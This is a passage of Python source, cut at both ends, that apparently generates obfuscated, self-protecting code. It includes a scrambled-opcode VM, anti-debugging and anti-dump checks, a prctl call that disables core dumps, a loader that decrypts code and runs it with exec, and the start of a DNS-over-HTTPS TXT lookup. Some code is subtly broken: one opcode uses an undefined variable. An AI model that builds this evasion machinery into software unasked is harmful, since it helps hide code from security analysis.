    "FUNC_STATE_REC": FUNC_STATE_REC,
    "FUNC_STATE_ON1": FUNC_STATE_ON1,
    "FUNC_STATE_ZIP1": FUNC_STATE_ZIP1,
    "FUNC_STATE_ON2": FUNC_STATE_ON2,
    "FUNC_STATE_DEC1": FUNC_STATE_DEC1,
    "FUNC_STATE_VM": FUNC_STATE_VM,
    "FUNC_STATE_PAD": FUNC_STATE_PAD,
    "FUNC_STATE_LOAD": FUNC_STATE_LOAD,
    "FUNC_STATE_EXEC": FUNC_STATE_EXEC,
})
def apply_vars(text):
    if not isinstance(text, str): return text
    for k, v in VARS.items():
        if f"{{{k}}}" in text:
            text = text.replace(f"{{{k}}}", str(v))
    return text
def generate_mba_add(rng):
    forms = ["((a ^ b) + 2 * (a & b))", "((a | b) + (a & b))", "((a & ~b) + (b & ~a) + 2*(a & b))"]
    return rng.choice(forms)
def generate_mba_xor(rng):
    forms = ["((a | b) - (a & b))", "((a | b) & (~a | ~b))", "(a + b - 2*(a & b))"]
    return rng.choice(forms)
def generate_poly_vm(vars_dict, rng):
    locals().update(vars_dict)
    nx_poison_key = "globals().get(b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode(), 0)"
    indent = " " * 20
    add_impl = f"""if isinstance(a, int):
{indent}    p = {nx_poison_key}
{indent}    res = ({generate_mba_add(rng)} + p) & 0xFF 
{indent}    self.stack.append(res)
{indent}else: self.stack.append(a+b)"""
    mba_xor = generate_mba_xor(rng)
    xor_impl = f"""if isinstance(a, int):
{indent}    p = {nx_poison_key}
{indent}    self.stack.append(({mba_xor}) ^ p)
{indent}elif isinstance(a, bytes): self.stack.append(bytes([x^y for x,y in zip(a,b)]))
{indent}else: self.stack.append(a^b)"""
    return f'''
class {vars_dict["VM_CLS"]}:
    def __init__(self, op_map, seed):
        self.op = op_map
        self.stack = []
        self.mem = {{}}
        self.seed = seed
        self._decoy_state = {{}}
        self._exec_count = 0
        try:
            pass
            self._op_hash = _nixon_ハッシュ해시.sha256(_nixon_ジェイソン제이슨.dumps(op_map, sort_keys=True).encode()).digest()
        except:
             self._op_hash = _nixon_ハッシュ해시.sha256(str(sorted(op_map.items())).encode()).digest()
        self._dump_check_interval = 15
    def {{METHOD_INTEGRITY}}(self):
        pass
        try:
            current_hash = _nixon_ハッシュ해시.sha256(_nixon_ジェイソン제이슨.dumps(self.op, sort_keys=True).encode()).digest()
        except:
            current_hash = _nixon_ハッシュ해시.sha256(str(sorted(self.op.items())).encode()).digest()
        if current_hash != self._op_hash: return False
        return True
    def {{METHOD_RUN}}(self, bytecode, inputs):
        if not self.{{METHOD_INTEGRITY}}(): return None
        pc = 0
        l = len(bytecode)
        OP_LOAD_ARG = 0; OP_PUSH_VAL = 1; OP_DUP = 2; OP_SWAP = 3
        OP_XOR = 4; OP_ADD = 5; OP_ROL = 6; OP_HASH = 7
        OP_JMP = 8; OP_JZ = 9; OP_RET = 10
        while pc < l:
            if pc % self._dump_check_interval == 0: self.{{METHOD_ANTI_DUMP}}()
            if pc % 20 == 0: self.{{METHOD_ANTI_DBG}}()
            raw_op = bytecode[pc]
            op = self.op.get(raw_op, -1)
            op_key = pc & 0xFF
            if self._exec_count % 10 == 0:
                self._decoy_state[self._exec_count] = _nixon_ハッシュ해시.sha256(str(pc).encode()).digest()
            if op == OP_LOAD_ARG:
                if pc + 1 >= l: break
                idx = bytecode[pc+1] ^ op_key
                if idx < len(inputs): self.stack.append(inputs[idx])
                pc += 2
            elif op == OP_PUSH_VAL:
                if pc + 1 >= l: break
                val = bytecode[pc+1] ^ op_key
                self.stack.append(val)
                pc += 2
            elif op == OP_DUP:
                if self.stack: self.stack.append(self.stack[-1])
                pc += 1
            elif op == OP_SWAP:
                if len(self.stack) >= 2:
                    a, b = self.stack.pop(), self.stack.pop()
                    self.stack.append(a); self.stack.append(b)
                pc += 1
            elif op == OP_XOR:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    {xor_impl}
                pc += 1
            elif op == OP_ADD:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    {add_impl}
                pc += 1
            elif op == OP_ROL:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int):
                        b = b % 8
                        self.stack.append(((a << b) | (a >> (8 - b))) & 0xFF)
                    else: self.stack.append(a)
                pc += 1
            elif op == OP_HASH:
                if self.stack:
                    val = self.stack.pop()
                    if isinstance(val, str): val = val.encode()
                    if isinstance(val, int): val = str(val).encode()
                    self.stack.append(_nixon_ハッシュ해시.sha256(val).digest())
                pc += 1
            elif op == OP_JMP:
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                pc = off
            elif op == OP_JZ:
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                if self.stack:
                    cond = self.stack.pop()
                    if cond == 0: pc = off
                    else: pc += 3
                else: pc += 3
            elif op == OP_RET:
                res = self.stack.pop() if self.stack else None
                self.stack[:] = [b'\\x00' * 32]
                self.op = {{k: _nixon_ハッシュ해시.sha256(str(v).encode() + b'DEAD').digest()[0] for k, v in self.op.items()}}
                return res
            else: pc += 1
        return self.stack.pop() if self.stack else None
    def {{METHOD_ANTI_DBG}}(self):
        self._exec_count += 1
        if self._exec_count % 100 == 0:
            pass
            start = _nixon_時間시간.perf_counter(); _=sum(range(5000)); elapsed = _nixon_時間시간.perf_counter() - start
            if elapsed > 0.1 and self.stack: self.stack[-1] = b'\\x00' * 32
        if _nixon_システム시스템.gettrace() and self.stack: self.stack[-1] = b'\\x00' * 32
    def {{METHOD_ANTI_DUMP}}(self):
        o_id = id(self.stack); _ = self.stack + []
        if id(self.stack) != o_id: self.stack[:] = [b'\\x00' * 32]
'''
VM_FACTORY_SOURCE = r'''
class {VM_FACTORY_CLS}:
    def __init__(self, base_seed):
        self._seed = base_seed
        self._layers = []
    def generate_layer(self, depth=0):
        rng = _nixon_ランダム무작위.Random(self._seed + depth)
        ops = list(range(15))
        rng.shuffle(ops)
        op_map = {i: ops[i] for i in range(len(ops))}
        return op_map
    def execute_nested(self, bytecode, inputs):
        l1_ops = self.generate_layer(1)
        l2_ops = self.generate_layer(2) 
        l3_ops = self.generate_layer(3)
        h1 = _nixon_ハッシュ해시.sha256(str(l1_ops).encode()).digest()
        h2 = _nixon_ハッシュ해시.sha256(str(l2_ops).encode()).digest() 
        combined = _nixon_ハッシュ해시.sha256(h1 + h2).hexdigest()
        return True
'''
CYTHON_VM_SOURCE = r'''from libc.stdlib cimport malloc, free
import marshal
cdef class NativeVM:
    cdef dict op
    cdef list stack
    cdef int seed
    cdef int exec_count
    def __init__(self, op_map, seed):
        self.op = op_map
        self.stack = []
        self.seed = seed
        self.exec_count = 0
    def exec_secure(self, bytes encrypted, bytes key):
        cdef int l = len(encrypted)
        cdef int kl = len(key)
        cdef char* buffer = <char*>malloc(l)
        cdef char* k_buf = <char*>key
        cdef char* enc_buf = <char*>encrypted
        cdef int i
        if not buffer: return
        for i in range(l):
            buffer[i] = enc_buf[i] ^ k_buf[i % kl]
        cdef bytes decrypted = buffer[:l]
        for i in range(l): buffer[i] = 0
        free(buffer)
        exec(marshal.loads(decrypted), globals())
    def {METHOD_RUN}(self, bytes bytecode, list inputs):
        cdef int pc = 0
        cdef int l = len(bytecode)
        cdef int raw_op
        cdef int op
        cdef int idx
        cdef int val
        cdef int op_key
        cdef int low
        cdef int high
        cdef int off
        while pc < l:
            self.exec_count += 1
            if self.exec_count % 500 == 0:
                t0 = _nixon_時間시간.time()
                _ = self.exec_count + 1
                t1 = _nixon_時間시간.time()
                if (t1 - t0) > 0.5:
                    self.stack[:] = [] 
            raw_op = bytecode[pc]
            op = self.op.get(raw_op, -1)
            op_key = pc & 0xFF
            if op == 0: 
                if pc + 1 >= l: break
                idx = bytecode[pc+1] ^ op_key
                if idx < len(inputs): self.stack.append(inputs[idx])
                pc += 2
            elif op == 1: 
                if pc + 1 >= l: break
                val = bytecode[pc+1] ^ op_key
                self.stack.append(val)
                pc += 2
            elif op == 2: 
                if len(self.stack) > 0: self.stack.append(self.stack[-1])
                pc += 1
            elif op == 3: 
                if len(self.stack) >= 2:
                    a, b = self.stack.pop(), self.stack.pop()
                    self.stack.append(a); self.stack.append(b)
                pc += 1
            elif op == 4: 
                if len(self.stack) < 2: break
                b, a = self.stack.pop(), self.stack.pop()
                if isinstance(a, bytes): self.stack.append(bytes([x^y for x,y in zip(a,b)]))
                else: self.stack.append(a ^ b)
                pc += 1
            elif op == 5: 
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int): self.stack.append((a + b) & 0xFF)
                    else: self.stack.append(a)
                pc += 1
            elif op == 6: 
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int):
                        b = b % 8
                        self.stack.append(((a << b) | (a >> (8 - b))) & 0xFF)
                    else: self.stack.append(a)
                pc += 1
            elif op == 7: 
                if not self.stack: break
                v = self.stack.pop()
                if isinstance(v, str): v = v.encode()
                if isinstance(v, int): val = str(val).encode()
                self.stack.append(_nixon_ハッシュ해시.sha256(v).digest())
                pc += 1
            elif op == 8: 
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                pc = off
            elif op == 9: 
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                if self.stack:
                    cond = self.stack.pop()
                    if cond == 0: pc = off
                    else: pc += 3
                else: pc += 3
            elif op == 10: 
                if not self.stack: return None
                res = self.stack.pop()
                self.stack[:] = [] 
                return res
            else: pc += 1
        return None'''
CIPHER_SOURCE = r'''class {CIPHER_CLS}:
    def __init__(self, key):
        self.key = key
    def decrypt(self, data, nonce):
        out = bytearray(data)
        l = len(out)
        poison_offset = globals().get(b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode(), 0)
        adjusted_key = bytes([b ^ poison_offset for b in self.key])
        k_h = _nixon_ハッシュ해시.sha256(adjusted_key + nonce).digest()
        for i in range(0, l):
            if i % 32 == 0: k_h = _nixon_ハッシュ해시.sha256(k_h + str(i).encode()).digest()
            out[i] ^= k_h[i % 32]
        return bytes(out)'''
WHITEBOX_AES_SBOX = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]
WHITEBOX_AES_INV_SBOX = [
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
]
def generate_whitebox_tables(build_seed):
    rng = random.Random(build_seed)
    tables = []
    for round_num in range(10):
        round_key = bytes([rng.randint(0, 255) for _ in range(16)])
        t_boxes = []
        for byte_pos in range(16):
            t_box = []
            for input_val in range(256):
                sbox_out = WHITEBOX_AES_SBOX[input_val]
                key_byte = round_key[byte_pos]
                encoded = sbox_out ^ key_byte ^ ((round_num * 17 + byte_pos * 13) & 0xFF)
                t_box.append(encoded)
            t_boxes.append(t_box)
        tables.append(t_boxes)
    return tables
WHITEBOX_CIPHER_SOURCE = r'''
class {WHITEBOX_CLS}:
    def __init__(self, tables, encoding_key):
        self.tables = tables
        self.enc_key = encoding_key
        self._input_perm = self._gen_perm(encoding_key[:16])
        self._output_perm = self._gen_perm(encoding_key[16:32])
    def _gen_perm(self, seed_bytes):
        perm = list(range(256))
        rng_state = int.from_bytes(seed_bytes, 'little') if len(seed_bytes) >= 8 else sum(seed_bytes)
        for i in range(255, 0, -1):
            rng_state = (rng_state * 1103515245 + 12345) & 0x7FFFFFFF
            j = rng_state % (i + 1)
            perm[i], perm[j] = perm[j], perm[i]
        return perm
    def _inv_perm(self, perm):
        inv = [0] * 256
        for i, v in enumerate(perm):
            inv[v] = i
        return inv
    def _gf_mul(self, a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            hi = a & 0x80
            a = (a << 1) & 0xFF
            if hi: a ^= 0x1B
            b >>= 1
        return p
    def _gf_inv(self, a):
        if a == 0: return 0
        r = a
        for _ in range(6):
            r = self._gf_mul(r, r)
            r = self._gf_mul(r, a)
        return r
    def _build_affine(self, seed_bytes):
        if len(seed_bytes) < 2:
            return (1, 0)
        mult = seed_bytes[0] | 1
        add_c = seed_bytes[1]
        return (mult, add_c)
    def _affine_encode(self, byte_val, mult, add_c):
        return (self._gf_mul(byte_val, mult) ^ add_c) & 0xFF
    def _affine_decode(self, byte_val, mult, add_c):
        return self._gf_mul(byte_val ^ add_c, self._gf_inv(mult))
    def {METHOD_ENCODE_INPUT}(self, data):
        affine_seed = self.enc_key[32:48] if len(self.enc_key) > 32 else self.enc_key[:16]
        mult, add_c = self._build_affine(affine_seed[:2])
        perm_encoded = bytes([self._input_perm[b] for b in data])
        return bytes([self._affine_encode(b, mult, add_c) for b in perm_encoded])
    def {METHOD_DECODE_OUTPUT}(self, data):
        affine_seed = self.enc_key[32:48] if len(self.enc_key) > 32 else self.enc_key[16:32]
        mult, add_c = self._build_affine(affine_seed[:2])
        affine_decoded = bytes([self._affine_decode(b, mult, add_c) for b in data])
        inv = self._inv_perm(self._output_perm)
        return bytes([inv[b] for b in affine_decoded])
    def {METHOD_WB_ROUND}(self, state, round_idx):
        if round_idx >= len(self.tables): return state
        t_boxes = self.tables[round_idx]
        new_state = bytearray(16)
        for i in range(16):
            if i < len(t_boxes) and state[i] < len(t_boxes[i]):
                new_state[i] = t_boxes[i][state[i]]
            else:
                new_state[i] = state[i]
        new_state = self._shift_rows(new_state)
        if round_idx < len(self.tables) - 1:
            new_state = self._mix_columns(new_state)
        return bytes(new_state)
    def _shift_rows(self, state):
        return bytes([
            state[0], state[5], state[10], state[15],
            state[4], state[9], state[14], state[3],
            state[8], state[13], state[2], state[7],
            state[12], state[1], state[6], state[11]
        ])
    def _xtime(self, a):
        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1) & 0xFF
    def _mix_columns(self, state):
        result = bytearray(16)
        for i in range(4):
            col = [state[i*4+j] for j in range(4)]
            result[i*4+0] = self._xtime(col[0]) ^ self._xtime(col[1]) ^ col[1] ^ col[2] ^ col[3]
            result[i*4+1] = col[0] ^ self._xtime(col[1]) ^ self._xtime(col[2]) ^ col[2] ^ col[3]
            result[i*4+2] = col[0] ^ col[1] ^ self._xtime(col[2]) ^ self._xtime(col[3]) ^ col[3]
            result[i*4+3] = self._xtime(col[0]) ^ col[0] ^ col[1] ^ col[2] ^ self._xtime(col[3])
        return bytes(result)
    def {METHOD_WB_ENCRYPT}(self, data):
        result = bytearray()
        for block_start in range(0, len(data), 16):
            block = data[block_start:block_start+16]
            if len(block) < 16:
                block = block + bytes(16 - len(block))
            block = self.{METHOD_ENCODE_INPUT}(block)
            state = block
            for r in range(len(self.tables)):
                state = self.{METHOD_WB_ROUND}(state, r)
            state = self.{METHOD_DECODE_OUTPUT}(state)
            result.extend(state)
        return bytes(result)
    def {METHOD_WB_DECRYPT}(self, data):
        result = bytearray()
        for block_start in range(0, len(data), 16):
            block = data[block_start:block_start+16]
            if len(block) < 16:
                block = block + bytes(16 - len(block))
            state = self.{METHOD_ENCODE_INPUT}(block)
            for r in range(len(self.tables) - 1, -1, -1):
                state = self._inv_round(state, r)
            state = self.{METHOD_DECODE_OUTPUT}(state)
            result.extend(state)
        return bytes(result)
    def _inv_round(self, state, round_idx):
        if round_idx < len(self.tables) - 1:
            state = self._inv_mix_columns(state)
        state = self._inv_shift_rows(state)
        t_boxes = self.tables[round_idx]
        new_state = bytearray(16)
        for i in range(16):
            found = False
            for in_val in range(256):
                if i < len(t_boxes) and t_boxes[i][in_val] == state[i]:
                    new_state[i] = in_val
                    found = True
                    break
            if not found:
                new_state[i] = state[i]
        return bytes(new_state)
    def _inv_shift_rows(self, state):
        return bytes([
            state[0], state[13], state[10], state[7],
            state[4], state[1], state[14], state[11],
            state[8], state[5], state[2], state[15],
            state[12], state[9], state[6], state[3]
        ])
    def _inv_mix_columns(self, state):
        result = bytearray(16)
        for i in range(4):
            col = [state[i*4+j] for j in range(4)]
            result[i*4+0] = self._mul(0x0e, col[0]) ^ self._mul(0x0b, col[1]) ^ self._mul(0x0d, col[2]) ^ self._mul(0x09, col[3])
            result[i*4+1] = self._mul(0x09, col[0]) ^ self._mul(0x0e, col[1]) ^ self._mul(0x0b, col[2]) ^ self._mul(0x0d, col[3])
            result[i*4+2] = self._mul(0x0d, col[0]) ^ self._mul(0x09, col[1]) ^ self._mul(0x0e, col[2]) ^ self._mul(0x0b, col[3])
            result[i*4+3] = self._mul(0x0b, col[0]) ^ self._mul(0x0d, col[1]) ^ self._mul(0x09, col[2]) ^ self._mul(0x0e, col[3])
        return bytes(result)
    def _mul(self, a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            hi = a & 0x80
            a = (a << 1) & 0xFF
            if hi: a ^= 0x1B
            b >>= 1
        return p
'''
IO_ENCODING_SOURCE = r'''
class {IO_ENCODER_CLS}:
    def __init__(self, seed):
        self._seed = seed
        self._fwd_table = self._build_table(seed)
        self._inv_table = self._invert_table(self._fwd_table)
    def _build_table(self, seed):
        rng = _nixon_ランダム무작위.Random(seed)
        table = list(range(256))
        for i in range(255, 0, -1):
            j = rng.randint(0, i)
            table[i], table[j] = table[j], table[i]
        return table
    def _invert_table(self, table):
        inv = [0] * 256
        for i, v in enumerate(table):
            inv[v] = i
        return inv
    def {METHOD_IO_ENCODE}(self, data):
        return bytes([self._fwd_table[b] for b in data])
    def {METHOD_IO_DECODE}(self, data):
        return bytes([self._inv_table[b] for b in data])
'''
DUAL_CIPHER_SOURCE = r'''
class {DUAL_CIPHER_CLS}:
    def __init__(self, xor_key, wb_tables, encoding_key):
        self.xor_key = xor_key if isinstance(xor_key, bytes) else xor_key.encode()
        self.wb = {WHITEBOX_CLS}(wb_tables, encoding_key)
        self._state_a = _nixon_ハッシュ해시.sha256(self.xor_key).digest()
        self._state_b = _nixon_ハッシュ해시.sha256(encoding_key).digest()
    def _xor_round(self, data, round_num):
        key = _nixon_ハッシュ해시.sha256(self._state_a + round_num.to_bytes(4, 'little')).digest()
        self._state_a = key
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= key[i % 32]
        return bytes(result)
    def _wb_round(self, data, round_num):
        if len(data) < 16:
            data = data + bytes(16 - len(data))
        state = data[:16]
        state = self.wb.{METHOD_WB_ROUND}(state, round_num % len(self.wb.tables))
        self._state_b = _nixon_ハッシュ해시.sha256(self._state_b + state).digest()
        return state + data[16:]
    def {METHOD_DUAL_ENCRYPT}(self, data):
        result = data
        for r in range(5):
            result = self._xor_round(result, r * 2)
            result = self._wb_round(result, r * 2 + 1)
            self._state_a = _nixon_ハッシュ해시.sha256(self._state_a + self._state_b).digest()
        return result
    def {METHOD_DUAL_DECRYPT}(self, data):
        states_a = [self._state_a]
        states_b = [self._state_b]
        for r in range(5):
            key = _nixon_ハッシュ해시.sha256(states_a[-1] + (r * 2).to_bytes(4, 'little')).digest()
            states_a.append(key)
            if len(data) >= 16:
                state = self.wb.{METHOD_WB_ROUND}(data[:16], (r * 2 + 1) % len(self.wb.tables))
                states_b.append(_nixon_ハッシュ해시.sha256(states_b[-1] + state).digest())
            states_a.append(_nixon_ハッシュ해시.sha256(states_a[-1] + states_b[-1]).digest())
        result = data
        for r in range(4, -1, -1):
            result = self._inv_wb_round(result, r * 2 + 1)
            result = self._inv_xor_round(result, states_a[r * 2])
        return result
    def _inv_xor_round(self, data, state):
        key = _nixon_ハッシュ해시.sha256(state).digest()[:32]
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= key[i % 32]
        return bytes(result)
    def _inv_wb_round(self, data, round_num):
        if len(data) < 16:
            data = data + bytes(16 - len(data))
        state = self.wb._inv_round(data[:16], round_num % len(self.wb.tables))
        return state + data[16:]
'''
SECURE_MEM_SOURCE = r'''class {FUNC_SEC_MEM}:
    def __init__(self, data):
        if isinstance(data, str): data = data.encode()
        elif not isinstance(data, bytes): data = str(data).encode()
        self._l = len(data)
        self._c = _nixon_シータイプ씨타입
        self._k = _nixon_シークレット시크릿.token_bytes(self._l)
        enc = bytes([a ^ b for a, b in zip(data, self._k)])
        self._b = self._c.create_string_buffer(enc, self._l)
    def {METHOD_T}(self):
        if not self._b or not self._c: return
        try:
            p = self._c.cast(self._b, self._c.POINTER(self._c.c_char))
            for i in range(self._l):
                p[i] = bytes([ord(p[i]) ^ self._k[i]])
        except: pass
    def __enter__(self):
        self.{METHOD_T}()
        return self._b.raw
    def __exit__(self, t, v, tb):
        self.{METHOD_T}()
class {FUNC_ADV_HK}:
    @staticmethod
    def {METHOD_CHECK}():
        return False'''
HEAP_ENCRYPT_SOURCE = r'''
class {HEAP_ENCRYPT_CLS}:
    def __init__(self, key=None):
        self._key = key if key else _nixon_シークレット시크릿.token_bytes(32)
        self._buffer = {}
        self._access_log = []
    def write(self, addr_id, data):
        if not isinstance(data, bytes):
            if isinstance(data, str): data = data.encode()
            else: data = str(data).encode()
        nonce = _nixon_シークレット시크릿.token_bytes(4)
        k_h = _nixon_ハッシュ해시.sha256(self._key + nonce).digest()
        enc_data = bytearray(len(data))
        for i in range(len(data)):
            enc_data[i] = data[i] ^ k_h[i % 32]
        self._buffer[addr_id] = {'n': nonce, 'd': bytes(enc_data)}
        return True
    def read(self, addr_id):
        if addr_id not in self._buffer: return None
        entry = self._buffer[addr_id]
        nonce = entry['n']
        enc_data = entry['d']
        k_h = _nixon_ハッシュ해시.sha256(self._key + nonce).digest()
        dec_data = bytearray(len(enc_data))
        for i in range(len(enc_data)):
            dec_data[i] = enc_data[i] ^ k_h[i % 32]
        return bytes(dec_data)
    def wipe(self, addr_id):
        if addr_id in self._buffer:
            l = len(self._buffer[addr_id]['d'])
            self._buffer[addr_id] = {'n': b'\x00'*4, 'd': _nixon_オペレーション운영.urandom(l)}
            del self._buffer[addr_id]
            return True
        return False
    def wipe_all(self):
        keys = list(self._buffer.keys())
        for k in keys: self.wipe(k)
'''
ANTMAN_SOURCE = r'''def {FUNC_ANTMAN}():
    if {IS_DEBUG}: _打印輸出한글ไทย("[DEBUG] Entering AntMan")
    try:
        if _nixon_プラットフォーム플랫폼.system() == "Linux":
            pass
            try:
                try:
                    libc = _nixon_シータイプ씨타입.CDLL(_nixon_シータイプ씨타입.util.find_library("c"))
                except Exception:
                    try:
                        libc = _nixon_シータイプ씨타입.CDLL("libc.so.6")
                    except Exception:
                        try: libc = _nixon_シータイプ씨타입.CDLL("libc.so")
                        except Exception: return True
                libc.prctl.argtypes = [_nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong]
                libc.prctl.restype = _nixon_シータイプ씨타입.c_int
                res = libc.prctl(4, 0, 0, 0, 0)
                if {IS_DEBUG}: _打印輸出한글ไทย(f"[DEBUG] AntMan Result: {{res}}")
            except Exception as e:
                if {IS_DEBUG}: _打印輸出한글ไทย(f"[WARN] AntMan Failed: {{e}}")
    except Exception: pass'''
API_HASH_SOURCE = r'''def {FUNC_API_HASH}(mod_name):
    try:
        return __import__(mod_name)
    except Exception: return None'''
STACK_STR_SOURCE = r'''def {FUNC_STACK_XOR}(data, key=0x55):
    return "".join([chr(ord(c) ^ key) for c in data])'''
RDTSC_SOURCE = r'''def {FUNC_RDTSC}():
    try:
        if {IS_DEBUG}: _打印輸出한글ไทย("[DEBUG] Entering RDTSC Check")
        machine = _nixon_プラットフォーム플랫폼.machine().lower()
        if "arm" in machine or "aarch" in machine:
            start = _nixon_時間시간.perf_counter()
            for i in range(100): x = i * i
            end = _nixon_時間시간.perf_counter()
            if (end - start) > 1.0: return True
            return False
        return False
    except Exception: return False'''
DOH_SOURCE = r'''def {FUNC_DOH}(domain):
    try:
        pass
        url = f"https://dns.google/resolve?name={{domain}}&type=TXT"
        req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={{"User-Agent": "Mozilla/5.0"}})
